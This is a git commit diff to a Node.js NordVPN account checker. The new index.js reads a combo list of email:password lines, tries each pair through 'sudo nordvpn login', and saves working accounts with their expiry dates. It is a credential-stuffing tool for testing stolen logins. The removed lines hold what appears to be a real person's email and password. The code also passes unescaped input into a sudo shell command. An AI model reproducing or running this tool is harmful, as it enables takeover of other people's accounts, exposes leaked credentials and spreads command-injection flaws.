505828d20245fb1f941847851392f179e0f01c4e
cr4r <ahmadfatchurrachman@gmail.com>
2021-05-17 12:17:24 +0700

    fix error

--- ceknord.js
+++ ceknord.js
@@ -1,29 +1,28 @@
 const { exec } = require('child_process')
 
-module.exports = doing = (userr,passs) => new Promise((resolve, reject) => {
-    exec('nordvpn logout',(error)=>{
-        exec(`nordvpn login -u ${userr} -p ${passs}`,(error,stdout) => {
-            let hasil = ""
-            if(error) resolve({'status':'no','result':'error\n\n'+error})
-            a = stdout.split(' ')
-            if(!(a.indexOf('\rWelcome') === -1)){
-                exec(`nordvpn account`,(error,stdout) => {
-                    if(error) resolve({'status':'no','result':'error saat melihat informasi'})
+module.exports = doing = (userr, passs) => new Promise((resolve, reject) => {
+    exec('sudo nordvpn logout', (error) => {
+        exec(`sudo nordvpn login -u ${userr} -p ${passs}`, (error, stdout, stderr) => {
+            if (stderr) resolve({ status: 'no', result: 'Error - stderr', saran: error });
+            if (error) resolve({ status: 'no', result: 'Error - Email/Password Salah!', saran: 'Periksa apakah system support dengan sudo atau tidak\ncek juga apakah sudah menginstall nordvpn dengan benar!' });
+            aa = stdout.split('\r');
+            a = aa[aa.length - 1].replace(/\n/g, '');
+            if (a.indexOf('Welcome') > -1) {
+                exec(`sudo nordvpn account`, (error, stdout) => {
+                    if (error) resolve({ 'status': 'no', 'result': 'error saat melihat informasi', saran: error })
                     aa = stdout.trim().split(' ')
-                    if(!(aa.indexOf('Active') === -1)){
-                        hasil = `${userr}:${passs} ${stdout.trim().split('(')[1].split(')')[0].split('Expires on ')[1]}`
-                        resolve({'status':'ok','result':hasil})
-                    }else if(!(aa.indexOf('Inactive') === -1)){
-                        resolve({'status':'ok','result':'inactive'})
-                    }else{
-                        resolve({'status':'no','result':'Gagal cek akun'})
-                    }
-                })
-            }else{
-                resolve({'status':'no','result':'Login gagal'})
+                    if (!(aa.indexOf('Active') === -1)) {
+                        hasil = `${userr}:${passs} ${stdout.trim().split('(')[1].split(')')[0].split('Expires on ')[1]}`;
+                        resolve({ 'status': 'ok', 'result': hasil });
+                    } else if (!(aa.indexOf('Inactive') === -1)) {
+                        resolve({ 'status': 'no', 'result': 'inactive' });
+                    } else {
+                        resolve({ status: 'no', result: 'Gagal cek akun', saran: 'Belum di identifikasi' });
+                    };
+                });
+            } else {
+                resolve({ status: 'no', result: 'Login gagal', saran: 'Periksa kembali email/password' })
             }
         })
-    })    
+    })
 })
-
-
--- index.js
+++ index.js
@@ -1,5 +1,69 @@
-const nord = require('./ceknord.js')
+process.on('SIGINT', function() {
+    console.log("Pengecekan akun nordvpn telah berhenti");
+    process.exit();
+});
 
-nord('lipspence@gmail.com','Landbj40').then((hsl)=> {
-    console.log(hsl)
-})
+const filterString = (str) => {
+    d = str.split(':');
+    for (a = 0; a < d.length - 1; a++) {
+        zz = d[a];
+        // cari email
+        email = "";
+        if (zz.split(' ').length > 1) {
+            for (pisah of zz.split(' ')) {
+                if (pisah.indexOf('@') > -1) {
+                    email = pisah;
+                    caripass = d[a + 1];
+                    if (caripass.split(' ').length > 1) {
+                        password = caripass.split(' ')[0];
+                    } else {
+                        password = caripass;
+                    };
+                    return { status: 'ok', result: { email, password } };
+                };
+            };
+        } else {
+            if (zz.indexOf('@') > -1) {
+                email = zz;
+                caripass = d[a + 1];
+                if (caripass.split(' ').length > 1) {
+                    password = caripass.split(' ')[0];
+                } else {
+                    password = caripass;
+                };
+                return { status: 'ok', result: { email, password } };
+            };
+        };
+    };
+};
+
+const nord = require('./ceknord.js')
+const fs = require('fs');
+
+fs.readFile('akun', 'utf8', async(err, data) => {
+    if (err) {
+        return console.log(err);
+    };
+    for (hasil of data.split('\n')) {
+        if (hasil) {
+            aa = await filterString(hasil);
+            console.log(aa.result)
+            if (aa && aa.status === "ok") {
+                hasill = `${aa.result.email}:${aa.result.password}\n`
+                result = aa.result;
+                await nord(result.email, result.password).then(async(hsl) => {
+                    if (hsl && hsl.status === "ok" && hsl.result !== "inactive") {
+                        await fs.writeFileSync('hasil', hsl.result + '\n', { flag: "a+" })
+                        console.log('BERHASIL', hsl.result)
+                    } else if (hsl && hsl.status === "no") {
+                        console.log(hsl.result)
+                    } else {
+                        console.log(hsl);
+                    };
+                });
+            } else {
+                console.error('Error', aa)
+            };
+        }
+    };
+});
